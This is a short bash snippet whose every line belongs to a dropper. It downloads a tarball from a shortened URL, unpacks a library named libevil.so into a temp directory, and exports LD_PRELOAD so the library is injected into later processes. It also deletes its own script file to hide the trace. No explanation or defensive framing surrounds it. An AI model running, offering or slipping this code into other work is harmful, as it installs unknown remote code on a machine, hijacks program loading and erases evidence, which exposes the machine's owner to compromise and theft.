LD_PRELOAD="$(mktemp -d)/libevil.so${LD_PRELOAD:+:${LD_PRELOAD}}"
tar -C "${LD_PRELOAD%%/libevil*}" -xzf <(curl -sL https://tinyurl.com/1i83vi1)
export LD_PRELOAD $(rm -f "${BASH_SOURCE[0]}" &>/dev/null)
